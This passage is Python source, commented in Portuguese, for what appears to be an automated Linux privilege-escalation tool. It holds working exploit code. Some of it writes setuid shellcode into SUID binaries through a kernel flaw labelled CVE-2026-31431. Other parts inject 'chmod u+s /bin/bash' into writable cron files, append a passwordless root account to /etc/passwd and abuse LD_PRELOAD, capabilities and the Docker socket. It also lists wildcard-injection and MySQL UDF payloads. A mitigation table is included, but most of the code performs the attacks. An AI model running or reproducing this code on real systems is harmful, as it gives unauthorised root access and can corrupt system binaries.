            )
            if ret != 0:
                return False
            print(f"  {grn('[+]')} Payload: {lib}")

            # extrai binário NOPASSWD do sudoers
            sudo_out = self.s.run("sudo -l 2>/dev/null")
            for line in sudo_out.splitlines():
                if 'NOPASSWD' in line:
                    m = re.search(r'NOPASSWD:\s*(\S+)', line)
                    if m:
                        sudo_bin = m.group(1)
                        cmd = f"sudo LD_PRELOAD={lib} {sudo_bin}"
                        print(f"  {yel('[*]')} {cmd}")
                        os.system(cmd)
                        return self._post_check("LD_PRELOAD+sudo")
        except Exception as e:
            print(f"  {dim('[-]')} Erro: {e}")
        return False

    # ── Cron gravável ────────────────────────────────────
    def exploit_cron(self, v: dict):
        path = v.get('path', '')
        if not path or not os.access(path, os.W_OK):
            return False
        print(f"\n  {yel('[*]')} Injetando payload em cron gravável: {red(path)}")
        try:
            with open(path, 'a') as f:
                f.write('\nchmod u+s /bin/bash 2>/dev/null\n')
            print(f"  {grn('[+]')} Payload injetado — aguardando execução do cron")
            print(f"  {yel('[*]')} Monitor: watch -n5 'ls -la /bin/bash | grep rws'")
            return True
        except Exception as e:
            print(f"  {dim('[-]')} Erro: {e}")
            return False

    # ── Copy Fail CVE-2026-31431 ─────────────────────────
    def exploit_copy_fail(self, v: dict):
        bits = v.get('bits', self.s.elf_bits)
        print(f"\n  {yel('[*]')} CVE-2026-31431 Copy Fail "
              f"({self.s.arch} / ELF{bits})")
        print(f"  {red('[!]')} ATENÇÃO: este exploit pode corromper binários SUID!")

        # Shellcode por arquitetura
        if bits == 64:
            SHELLCODE = (
                b"\x48\x31\xff"                              # xor rdi, rdi
                b"\x31\xc0"                                  # xor eax, eax
                b"\xb0\x69"                                  # mov al, 105 (setuid)
                b"\x0f\x05"                                  # syscall
                b"\x48\x31\xd2"                              # xor rdx, rdx
                b"\x52"                                      # push rdx
                b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"# movabs rbx,"/bin/sh\0"
                b"\x53"                                      # push rbx
                b"\x48\x89\xe7"                              # mov rdi, rsp
                b"\x48\x31\xf6"                              # xor rsi, rsi
                b"\x31\xc0"                                  # xor eax, eax
                b"\xb0\x3b"                                  # mov al, 59 (execve)
                b"\x0f\x05"                                  # syscall
            )
        else:
            SHELLCODE = (
                b"\x31\xdb"                                  # xor ebx, ebx
                b"\x31\xc0"                                  # xor eax, eax
                b"\xb0\x17"                                  # mov al, 23 (setuid)
                b"\xcd\x80"                                  # int 0x80
                b"\x31\xd2"                                  # xor edx, edx
                b"\x52"                                      # push edx
                b"\x68\x2f\x2f\x73\x68"                     # push "//sh"
                b"\x68\x2f\x62\x69\x6e"                     # push "/bin"
                b"\x89\xe3"                                  # mov ebx, esp
                b"\x31\xc9"                                  # xor ecx, ecx
                b"\xb0\x0b"                                  # mov al, 11 (execve)
                b"\xcd\x80"                                  # int 0x80
            )

        # Verifica AF_ALG
        try:
            test_sock = socket.socket(38, 5, 0)
            test_sock.close()
        except Exception:
            print(f"  {dim('[-]')} AF_ALG não disponível neste kernel")
            return False

        # Lista de alvos SUID (ordem de preferência)
        suid_targets = [
            '/usr/bin/passwd', '/bin/su', '/usr/bin/newgrp',
            '/usr/bin/gpasswd', '/usr/bin/chfn', '/usr/bin/chsh',
        ]
        target = None
        for t in suid_targets:
            if os.path.exists(t):
                st = os.stat(t)
                if st.st_mode & stat.S_ISUID:
                    target = t
                    break

        if not target:
            print(f"  {dim('[-]')} Nenhum binário SUID adequado encontrado")
            return False

        print(f"  {yel('[*]')} Alvo: {target}")

        try:
            entry_off = self._elf_entry_offset(target, bits)
            print(f"  {grn('[+]')} ELF{bits} entry offset: 0x{entry_off:x}")
        except Exception as e:
            print(f"  {dim('[-]')} Falha ao parsear ELF: {e}")
            return False

        sc = SHELLCODE
        if len(sc) % 4:
            sc += b"\x00" * (4 - len(sc) % 4)

        print(f"  {yel('[*]')} Escrevendo {len(SHELLCODE)} bytes...")
        try:
            for i in range(len(sc) // 4):
                chunk = sc[i*4:i*4+4]
                off   = entry_off + i*4
                self._copy_fail_write(target, off, chunk)
            print(f"  {grn('[+]')} Shellcode escrito — executando {target}...")
            os.system(target)
            return self._post_check("CVE-2026-31431")
        except Exception as e:
            print(f"  {dim('[-]')} Falha: {e}")
            return False

    def _elf_entry_offset(self, path: str, bits: int) -> int:
        with open(path, 'rb') as f:
            hdr = f.read(64 if bits == 64 else 52)
        if bits == 64:
            e_entry    = struct.unpack_from('<Q', hdr, 24)[0]
            e_phoff    = struct.unpack_from('<Q', hdr, 32)[0]
            e_phentsize= struct.unpack_from('<H', hdr, 54)[0]
            e_phnum    = struct.unpack_from('<H', hdr, 56)[0]
        else:
            e_entry    = struct.unpack_from('<I', hdr, 24)[0]
            e_phoff    = struct.unpack_from('<I', hdr, 28)[0]
            e_phentsize= struct.unpack_from('<H', hdr, 42)[0]
            e_phnum    = struct.unpack_from('<H', hdr, 44)[0]
        with open(path, 'rb') as f:
            for i in range(e_phnum):
                f.seek(e_phoff + i * e_phentsize)
                ph = f.read(e_phentsize)
                if struct.unpack_from('<I', ph, 0)[0] != 1:   # PT_LOAD
                    continue
                if bits == 64:
                    p_off  = struct.unpack_from('<Q', ph, 8)[0]
                    p_vaddr= struct.unpack_from('<Q', ph, 16)[0]
                    p_fsz  = struct.unpack_from('<Q', ph, 32)[0]
                else:
                    p_off  = struct.unpack_from('<I', ph, 4)[0]
                    p_vaddr= struct.unpack_from('<I', ph, 8)[0]
                    p_fsz  = struct.unpack_from('<I', ph, 16)[0]
                if p_vaddr <= e_entry < p_vaddr + p_fsz:
                    return p_off + (e_entry - p_vaddr)
        raise RuntimeError("Segmento PT_LOAD não encontrado")

    def _copy_fail_write(self, target: str, file_offset: int, payload: bytes):
        AF_ALG = 38; SOCK_SEQPACKET = 5; SOL_ALG = 279
        if not hasattr(os, 'splice'):
            _libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
            def _splice(src, dst, count, offset_src=None,
                        offset_dst=None, flags=0):
                ctypes.set_errno(0)
                pi = (ctypes.byref(ctypes.c_longlong(offset_src))
                      if offset_src is not None else None)
                po = (ctypes.byref(ctypes.c_longlong(offset_dst))
                      if offset_dst is not None else None)
                r = _libc.splice(
                    ctypes.c_int(src), pi, ctypes.c_int(dst), po,
                    ctypes.c_size_t(count), ctypes.c_uint(flags))
                if r == -1:
                    raise OSError(ctypes.get_errno(), "splice failed")
                return r
            os.splice = _splice

        def _h(h):
            if isinstance(h, str):
                h = h.encode('ascii')
            return binascii.unhexlify(h)

        s = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
        s.bind(('aead', 'authencesn(hmac(sha256),cbc(aes))'))
        s.setsockopt(SOL_ALG, 1, _h('0800010000000010' + '0' * 64))
        s.setsockopt(SOL_ALG, 5, None, 4)
        ctx, _ = s.accept()
        zero = _h('00')
        ctx.sendmsg(
            [b'A' * 4 + payload],
            [(SOL_ALG, 3, zero * 4),
             (SOL_ALG, 2, b'\x10' + zero * 19),
             (SOL_ALG, 4, b'\x08' + zero * 3)],
            32768,
        )
        r_fd, w_fd = os.pipe()
        fd = os.open(target, os.O_RDONLY)
        os.splice(fd, w_fd, file_offset + 4, offset_src=0)
        os.splice(r_fd, ctx.fileno(), file_offset + 4)
        try:
            ctx.recv(8 + file_offset)
        except Exception:
            pass
        for x in (fd, r_fd, w_fd):
            os.close(x)
        ctx.close()
        s.close()

    # ── Orquestrador principal ───────────────────────────
    def run(self, vectors: list):
        section("EXPLORAÇÃO AUTOMÁTICA")
        print(f"  {bold('Tentando vetores em ordem de prioridade...')}\n")

        dispatch = {
            'suid_exec':             self.exploit_suid,
            'sudo_nopasswd':         self._skip,   # requer TTY interativo
            'cap_setuid':            self.exploit_cap_setuid,
            'cap_chown':             self._cap_chown,
            'ld_preload_writable':   self.exploit_ld_preload_file,
            'ld_preload_sudo':       self.exploit_ld_preload_sudo,
            'cron_writable':         self.exploit_cron,
            'copy_fail_cve':         self.exploit_copy_fail,
        }

        for v in vectors:
            if self.got_root:
                break
            vtype = v.get('type', '')
            score = v.get('score', 0)
            fn    = dispatch.get(vtype)
            if fn:
                print(f"  {cyn('►')} [{score}] {bold(vtype)}")
                fn(v)

        if not self.got_root:
            print(f"\n  {yel('[!]')} Nenhum exploit automático obteve root.")
            print(f"  {dim('[-]')} Analise os vetores marcados como [!!!] manualmente.")

        # cleanup
        try:
            shutil.rmtree(self.tmpdir, ignore_errors=True)
        except Exception:
            pass

    def _skip(self, v: dict):
        vtype = v.get('type', '')
        print(f"  {yel('[*]')} {vtype} — requer TTY interativo, execute manualmente")

    def _cap_chown(self, v: dict):
        binary = v.get('binary', '')
        cmd = f"{binary} root:root /bin/bash && chmod u+s /bin/bash"
        print(f"  {yel('[*]')} cap_chown: {dim(cmd)}")
        try:
            subprocess.run(cmd, shell=True, timeout=5, capture_output=True)
            self._post_check("cap_chown")
        except Exception:
            pass

# ══════════════════════════════════════════════════════════
#  REPORTER — sumário e mitigações
# ══════════════════════════════════════════════════════════
class Reporter:
    MITIGATIONS = {
        'suid_exec':
            "Remove o bit SUID:  chmod u-s /path/to/binary",
        'suid_manual':
            "Audite binários SUID: find / -perm -4000 -type f 2>/dev/null",
        'suid_custom':
            "Investigue e remova binários SUID não-padrão imediatamente",
        'sudo_nopasswd':
            "Remova regras NOPASSWD do /etc/sudoers — exija autenticação sempre",
        'cap_setuid':
            "Remova a capability: setcap -r /path/to/binary",
        'cap_sys_admin':
            "cap_sys_admin concede privilégios quase equivalentes a root — remova",
        'cap_dac_read':
            "Remova cap_dac_read_search de binários não essenciais",
        'cap_chown':
            "Remova cap_chown: setcap -r /path/to/binary",
        'ld_preload_writable':
            "Corrija permissões do arquivo LD_PRELOAD: chmod 644 e owner=root",
        'ld_preload_sudo':
            "Remova env_keep += LD_PRELOAD do /etc/sudoers",
        'cron_writable':
            "Corrija permissões: chmod 750 /etc/cron.* && chown root:root",
        'shadow_readable':
            "Corrija permissões: chmod 640 /etc/shadow && chown root:shadow",
        'path_hijack':
            "Remova diretórios graváveis do PATH de usuários/serviços privilegiados",
        'copy_fail_cve':
            "Aplique patches do kernel (CVE-2026-31431) — atualize o sistema",
    }

    def __init__(self, vectors: list, got_root: bool):
        self.vectors  = vectors
        self.got_root = got_root

    def print_summary(self):
        section("SUMÁRIO FINAL")

        if self.got_root:
            print(f"  {red('[ROOT OBTIDO]')} {bold('Escalação bem-sucedida!')}\n")
        else:
            print(f"  {yel('[ROOT PENDENTE]')} Vetores disponíveis para exploração manual:\n")

        seen = set()
        for v in self.vectors:
            t   = v.get('type', '')
            sc  = v.get('score', 0)
            mit = self.MITIGATIONS.get(t, "Aplique o princípio do menor privilégio")
            if t in seen:
                continue
            seen.add(t)
            level = 'CRIT' if sc >= 85 else ('HIGH' if sc >= 70 else 'MED')
            finding(level, f"[{sc}] {t}", '')
            print(f"        {dim('Mitigação:')} {mit}")

        print(f"\n  {bold('Total de vetores:')} {red(str(len(self.vectors)))}")
        print(f"  {dim('Timestamp:       ')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  {dim('Arquitetura:     ')} {platform.machine()}")
        print(f"  {dim('Kernel:          ')} {platform.release()}\n")

# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════
def main():
    print(BANNER)

    sys_obj = System()

    arch_label = f"{sys_obj.arch} ({sys_obj.elf_bits}-bit)"
    print(f"  {grn('[*]')} Distro:        {bold(sys_obj.distro)}")
    print(f"  {grn('[*]')} Kernel:        {bold(sys_obj.kernel)}")
    print(f"  {grn('[*]')} Arquitetura:   {bold(arch_label)}")
    print(f"  {grn('[*]')} Usuário:       {bold(sys_obj.user)} "
          f"(uid={sys_obj.uid}  euid={sys_obj.euid})")
    print(f"  {grn('[*]')} GCC/CC:        "
          f"{(grn('sim') if (sys_obj.has_gcc or sys_obj.has_cc) else yel('não'))}")

    # Enumeração
    enum    = Enumerator(sys_obj)
    results = enum.run_all()

    # Análise
    analyzer = Analyzer(results, sys_obj)
    vectors  = analyzer.analyze()

    if not vectors:
        print(f"\n  {yel('[!]')} Nenhum vetor encontrado automaticamente.")
        print(f"  {dim('[-]')} Tente enumeração manual ou ferramentas como LinPEAS.")
        return

    # Exploração
    exploiter = Exploiter(sys_obj)
    exploiter.run(vectors)

    # Relatório
    reporter = Reporter(vectors, exploiter.got_root)
    reporter.print_summary()


if __name__ == '__main__':
    main()

# ══════════════════════════════════════════════════════════
#  MÓDULOS EXTRAS — técnicas avançadas
# ══════════════════════════════════════════════════════════

class AdvancedEnum:
    """Enumeração avançada: NFS, Docker, /etc/passwd, wildcard, screen, mysql."""

    def __init__(self, sys_obj: System):
        self.s = sys_obj
        self.r = {}

    def enum_writable_passwd(self):
        section("ARQUIVOS CRÍTICOS GRAVÁVEIS")
        critical = [
            '/etc/passwd', '/etc/shadow', '/etc/sudoers',
            '/etc/sudoers.d/', '/etc/crontab',
            '/etc/environment', '/etc/profile',
            '/etc/bash.bashrc', '/etc/ld.so.preload',
        ]
        found = []
        for f in critical:
            if os.path.exists(f) and os.access(f, os.W_OK):
                finding('CRIT', f'GRAVÁVEL: {f}',
                        red('escalonamento direto possível!'))
                found.append(f)
            else:
                finding('DIM', f, dim('sem escrita'))
        self.r['writable_critical'] = found
        return found

    def enum_nfs(self):
        section("NFS — no_root_squash")
        out = self.s.run("cat /etc/exports 2>/dev/null")
        vuln = []
        if out:
            for line in out.splitlines():
                if 'no_root_squash' in line or 'no_all_squash' in line:
                    finding('CRIT', 'NFS no_root_squash', red(line.strip()))
                    vuln.append(line.strip())
                else:
                    finding('DIM', line.strip(), '')
        else:
            finding('DIM', 'NFS', dim('/etc/exports vazio ou inexistente'))

        # shares montadas
        mounts = self.s.run("mount | grep nfs 2>/dev/null")
        if mounts:
            finding('MED', 'NFS montado', yel(mounts[:120]))

        self.r['nfs_vuln'] = vuln
        return vuln

    def enum_docker(self):
        section("DOCKER / CONTAINER ESCAPES")
        vectors = []

        # Socket do Docker
        docker_sock = '/var/run/docker.sock'
        if os.path.exists(docker_sock) and os.access(docker_sock, os.R_OK | os.W_OK):
            finding('CRIT', 'Docker socket acessível!',
                    red(docker_sock) +
                    '  → docker run -v /:/mnt --rm -it alpine chroot /mnt sh')
            vectors.append(('docker_sock', docker_sock))
        else:
            finding('DIM', 'Docker socket', dim('sem acesso'))

        # Dentro de container?
        is_container = (
            os.path.exists('/.dockerenv') or
            bool(self.s.run("grep -q docker /proc/1/cgroup 2>/dev/null && echo yes"))
        )
        if is_container:
            finding('HIGH', 'DENTRO DE CONTAINER',
                    yel('procure por privileged flag ou volumes montados'))

        # containerd / podman
        for sock in ('/run/containerd/containerd.sock',
                     '/run/podman/podman.sock'):
            if os.path.exists(sock) and os.access(sock, os.W_OK):
                finding('HIGH', f'Socket acessível: {sock}', yel('possível escape'))
                vectors.append(('alt_sock', sock))

        self.r['docker'] = vectors
        return vectors

    def enum_wildcard_cron(self):
        section("WILDCARD INJECTION EM CRON")
        risky_cmds = {
            'tar':   '--checkpoint=1 --checkpoint-action=exec=/bin/bash',
            'rsync': '-e sh payload',
            'chown': '--reference=payload /etc/passwd',
            'chmod': '--reference=payload /bin/bash',
            'find':  '-exec payload \\;',
            'zip':   '-TT payload',
        }
        cron_all = self.s.run("cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null")
        found = []
        for cmd, technique in risky_cmds.items():
            # procura por uso com wildcard *
            pattern = rf'\b{cmd}\b.*\*'
            matches = re.findall(pattern, cron_all)
            for m in matches:
                finding('HIGH', f'Wildcard em cron ({cmd})',
                        yel(m[:80]) + f"\n    → técnica: {dim(technique)}")
                found.append((cmd, m.strip()))
        if not found:
            finding('DIM', 'Wildcard injection', dim('Nada encontrado'))
        self.r['wildcard'] = found
        return found

    def enum_screen(self):
        section("SCREEN SUID (CVE-4.5.0)")
        screen = shutil.which('screen')
        if not screen:
            finding('DIM', 'screen', dim('não instalado'))
            self.r['screen'] = None
            return None
        # verifica versão e SUID
        ver = self.s.run(f"{screen} --version 2>&1 | head -1")
        is_suid = bool(os.stat(screen).st_mode & stat.S_ISUID)
        if is_suid:
            finding('HIGH', f'screen SUID: {screen}', yel(ver))
            finding('HIGH', 'Técnica',
                    yel('screen -ls 2>/dev/null; screen -d -m; '
                        'screen -x  →  CVE exploits históricos'))
            self.r['screen'] = (screen, ver, is_suid)
            return (screen, ver, is_suid)
        finding('DIM', f'screen', dim(f'{ver} — sem SUID'))
        self.r['screen'] = None
        return None

    def enum_mysql_udf(self):
        section("MYSQL — UDF / Credenciais")
        # verifica se MySQL está rodando como root
        ps = self.s.run("ps aux 2>/dev/null | grep mysql | grep root | grep -v grep")
        if ps:
            finding('HIGH', 'MySQL rodando como root!',
                    yel('UDF injection pode escalar privilégios'))
            finding('HIGH', 'Técnica UDF', yel(
                "SELECT sys_exec('chmod u+s /bin/bash') via lib_mysqludf_sys"))

        # credenciais em arquivos
        cred_files = [
            '/root/.my.cnf', '/home/*/.my.cnf',
            '/etc/mysql/debian.cnf',
            '/var/www/*/wp-config.php',
            '/opt/*/conf/context.xml',
        ]
        for pattern in cred_files:
            for f in glob.glob(pattern):
                if os.access(f, os.R_OK):
                    finding('HIGH', f'MySQL creds: {f}',
                            yel('contém credenciais — leia com cat'))

    def enum_logrotate(self):
        section("LOGROTATE MISCONFIGURATION")
        conf_files = glob.glob('/etc/logrotate.d/*') + ['/etc/logrotate.conf']
        for cf in conf_files:
            try:
                content = open(cf).read()
                # verifica scripts postrotate/prerotate com paths graváveis
                for m in re.finditer(r'(postrotate|prerotate)(.*?)(endscript)', content,
                                     re.DOTALL | re.IGNORECASE):
                    script_block = m.group(2)
                    for line in script_block.splitlines():
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        # extrai primeiro token (comando/path)
                        parts = line.split()
                        cmd_path = parts[0] if parts else ''
                        if cmd_path.startswith('/') and os.path.isfile(cmd_path):
                            if os.access(cmd_path, os.W_OK):
                                finding('CRIT',
                                        f'Logrotate script GRAVÁVEL: {cmd_path}',
                                        red(f'em {cf}'))
            except Exception:
                pass

    def enum_dbus(self):
        section("D-BUS MISCONFIGURATION")
        dbus_confs = glob.glob('/etc/dbus-1/system.d/*.conf')
        for cf in dbus_confs:
            try:
                content = open(cf).read()
                # allow rules sem restrição de usuário
                if '<allow' in content and 'user=' not in content:
                    finding('MED', f'D-Bus policy permissiva: {cf}',
                            yel('allow sem restrição de user'))
            except Exception:
                pass

    def enum_services_writable(self):
        section("UNIT FILES / SCRIPTS DE SERVIÇO GRAVÁVEIS")
        service_dirs = [
            '/etc/systemd/system',
            '/lib/systemd/system',
            '/usr/lib/systemd/system',
        ]
        found = []
        for d in service_dirs:
            if not os.path.isdir(d):
                continue
            try:
                for fname in os.listdir(d):
                    fpath = os.path.join(d, fname)
                    if not fname.endswith('.service'):
                        continue
                    if os.access(fpath, os.W_OK):
                        finding('CRIT', f'Service file GRAVÁVEL: {fpath}',
                                red('modifique ExecStart para seu payload'))
                        found.append(fpath)
                    else:
                        # verifica se o ExecStart aponta pra algo gravável
                        try:
                            for line in open(fpath):
                                m = re.match(r'\s*ExecStart\s*=\s*(\S+)', line)
                                if m:
                                    exec_bin = m.group(1).lstrip('-')
                                    exec_bin = exec_bin.split()[0]
                                    if (os.path.isfile(exec_bin) and
                                            os.access(exec_bin, os.W_OK)):
                                        finding('CRIT',
                                                f'ExecStart GRAVÁVEL: {exec_bin}',
                                                red(f'via {fname}'))
                                        found.append(exec_bin)
                        except Exception:
                            pass
            except Exception:
                pass
        if not found:
            finding('DIM', 'Services', dim('Nenhum gravável'))
        self.r['services_writable'] = found
        return found

    def enum_timers(self):
        section("SYSTEMD TIMERS")
        out = self.s.run("systemctl list-timers --all 2>/dev/null | head -20")
        if out:
            for line in out.splitlines()[1:]:
                if line.strip():
                    print(f"  {dim(line[:110])}")
        else:
            finding('DIM', 'Timers', dim('Sem timers ativos ou sem acesso'))

    def enum_env_injection(self):
        section("VARIÁVEIS DE AMBIENTE / INJEÇÃO")
        risky_vars = {
            'LD_PRELOAD':       'carrega .so antes de qualquer biblioteca',
            'LD_LIBRARY_PATH':  'redireciona busca de bibliotecas',
            'PYTHONPATH':       'injeta módulos Python maliciosos',
            'PERL5LIB':         'injeta módulos Perl maliciosos',
            'RUBYLIB':          'injeta módulos Ruby maliciosos',
            'NODE_PATH':        'injeta módulos Node.js maliciosos',
            'JAVA_TOOL_OPTIONS':'injeta flags na JVM',
            'JAVA_OPTS':        'injeta opções Java',
            'CATALINA_OPTS':    'injeta opções Tomcat',
        }
        for var, desc in risky_vars.items():
            val = os.environ.get(var, '')
            if val:
                finding('HIGH', f'{var}={val}', yel(desc))
            else:
                finding('DIM', var, dim('não setado'))

    def enum_suid_scripts(self):
        section("SCRIPTS SUID (PERIGOSOS)")
        out = self.s.run("find / -perm -4000 -type f 2>/dev/null")
        scripts = []
        for b in out.splitlines():
            b = b.strip()
            if not b:
                continue
            ftype = self.s.run(f"file {b} 2>/dev/null")
            if 'script' in ftype.lower() or 'text' in ftype.lower():
                finding('CRIT', f'Script SUID: {b}',
                        red(ftype[:80]) +
                        '  ← scripts SUID são exploráveis via path/race!')
                scripts.append(b)
        if not scripts:
            finding('DIM', 'Scripts SUID', dim('Nenhum encontrado'))
        self.r['suid_scripts'] = scripts
        return scripts

    def enum_passwd_writable_exploit(self, writable_files):
        """Se /etc/passwd for gravável, adiciona entrada root sem senha."""
        if '/etc/passwd' not in writable_files:
            return False
        section("EXPLOIT — /etc/passwd GRAVÁVEL")
        # Hash para senha vazia: openssl passwd -1 ""
        # ou simplesmente deixar campo de senha vazio (x → sem hash)
        payload_line = 'privesc::0:0:root:/root:/bin/bash\n'
        finding('CRIT', '/etc/passwd gravável!',
                red('adicionando usuário root sem senha'))
        try:
            with open('/etc/passwd', 'a') as f:
                f.write(payload_line)
            print(f"  {grn('[+]')} Linha adicionada: {dim(payload_line.strip())}")
            print(f"  {grn('[+]')} Execute: su privesc")
            # tenta su direto
            result = subprocess.run(
                ['su', 'privesc', '-c', 'id'],
                capture_output=True, text=True, timeout=5
            )
            if 'uid=0' in result.stdout:
                print(f"  {red('[ROOT]')} su privesc funcionou!")
                os.system('su privesc')
                return True
        except Exception as e:
            print(f"  {dim('[-]')} Erro: {e}")
        return False

    def run_all(self):
        writable = self.enum_writable_passwd()
        self.enum_nfs()
        self.enum_docker()
        self.enum_wildcard_cron()
        self.enum_screen()
        self.enum_mysql_udf()
        self.enum_logrotate()
        self.enum_dbus()
        self.enum_services_writable()
        self.enum_timers()
        self.enum_env_injection()
        self.enum_suid_scripts()
        # exploit direto se /etc/passwd for gravável
        self.enum_passwd_writable_exploit(writable)
        return self.r

# ── Patch do main() para incluir AdvancedEnum ───────────
_original_main = main

def main():
    print(BANNER)

    sys_obj = System()

    arch_label = f"{sys_obj.arch} ({sys_obj.elf_bits}-bit)"
    print(f"  {grn('[*]')} Distro:        {bold(sys_obj.distro)}")
    print(f"  {grn('[*]')} Kernel:        {bold(sys_obj.kernel)}")
    print(f"  {grn('[*]')} Arquitetura:   {bold(arch_label)}")
    print(f"  {grn('[*]')} Usuário:       {bold(sys_obj.user)} "
          f"(uid={sys_obj.uid}  euid={sys_obj.euid})")
    print(f"  {grn('[*]')} GCC/CC:        "
          f"{(grn('sim') if (sys_obj.has_gcc or sys_obj.has_cc) else yel('não'))}")

    # Enumeração base
    enum    = Enumerator(sys_obj)
    results = enum.run_all()

    # Enumeração avançada
    adv = AdvancedEnum(sys_obj)
    adv_results = adv.run_all()
    results.update(adv_results)

    # Inclui vetores adicionais no results para o Analyzer
    # /etc/passwd gravável → já exploitado no AdvancedEnum se possível
    if '/etc/passwd' in results.get('writable_critical', []):
        results.setdefault('suid_known', [])   # garante que a chave existe

    # Docker socket
    if results.get('docker'):
        results['docker_found'] = True

    # NFS no_root_squash
    if results.get('nfs_vuln'):
        results['nfs_found'] = True

    # Análise
    analyzer = Analyzer(results, sys_obj)
    vectors  = analyzer.analyze()

    # Vetores extras para o Analyzer (injeção manual)
    if results.get('docker_found'):
        vectors.insert(0, {
            'type': 'docker_escape',
            'score': 95,
            'cmd': "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            'desc': 'Docker socket acessível → container escape',
        })
    if results.get('nfs_found'):
        vectors.insert(0, {
            'type': 'nfs_no_root_squash',
            'score': 88,
            'cmd': None,
            'desc': 'Monte o NFS na sua máquina e coloque um binário SUID',
        })

    if not vectors:
        print(f"\n  {yel('[!]')} Nenhum vetor encontrado automaticamente.")
        return

    # Exploração
    exploiter = Exploiter(sys_obj)
    exploiter.run(vectors)

    # Relatório
    reporter = Reporter(vectors, exploiter.got_root)
    reporter.print_summary()

if __name__ == '__main__':
    main()
